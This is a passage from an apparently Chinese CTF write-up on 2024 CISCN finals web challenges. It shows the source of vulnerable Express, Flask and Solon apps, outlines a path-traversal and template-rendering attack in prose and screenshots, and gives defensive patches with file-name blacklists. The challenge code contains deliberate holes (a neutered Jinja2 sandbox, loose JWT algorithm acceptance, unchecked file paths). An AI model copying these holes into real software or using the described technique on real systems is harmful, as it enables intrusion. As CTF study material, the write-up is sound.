property">"start"</span><span class="token operator">:</span> <span class="token string">"node app.js"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.6"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.4"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ejs v3.1.6，但是看了下<code>render</code>没有参数可控</p><p>接下来考虑express引擎解析的漏洞，参考：<a href="https://xz.aliyun.com/t/13512">https://xz.aliyun.com/t/13512</a></p><p>上传index.js</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112355986.png" alt="image-20240720112355986"></p><p>然后目录穿越移动到node_modules下</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112416310.png" alt="image-20240720112416310"></p><p>接下来再上传一个.ttt后缀的文件</p><p>接下来&#x2F;render路由先渲染1.ttt，再渲染1.ejs即可带出回显</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112540877.png" alt="image-20240720112540877"></p><p>然后换一个后缀故技重施即可</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112948693.png" alt="image-20240720112948693"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112927334.png" alt="image-20240720112927334"></p><hr><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>加一下中间件和重命名的路径名称黑名单即可，应该只需要过滤上传js即可，感觉是这么抢血的</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 配置 multer 上传中间件</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.js'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .js，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .js files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*...*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ShareCard"><a href="#ShareCard" class="headerlink" title="ShareCard"></a>ShareCard</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> current_app<span class="token keyword">from</span> jinja2<span class="token punctuation">.</span>sandbox <span class="token keyword">import</span> SandboxedEnvironment<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> qrcode<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> jwt<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'create_card'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地要调试的时候发现给的dist-packages还缺依赖，难搞</p><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>本题由@Laffey修复</p><p>加盐</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'avatar'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'signature'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'salt'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">#</span>    <span class="token keyword">if</span> <span class="token string">'&#123;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature <span class="token keyword">or</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception    <span class="token comment">#</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="SolonMaster"><a href="#SolonMaster" class="headerlink" title="SolonMaster"></a>SolonMaster</h2><p>就一个控制器DemoController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token 